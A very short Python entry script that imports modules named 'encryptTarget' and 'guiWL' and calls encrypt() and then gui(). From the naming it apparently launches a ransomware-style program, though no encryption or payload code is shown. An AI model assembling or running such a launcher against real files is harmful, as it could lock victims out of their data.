from encryptTarget import *
from guiWL import *

encrypt()
gui()

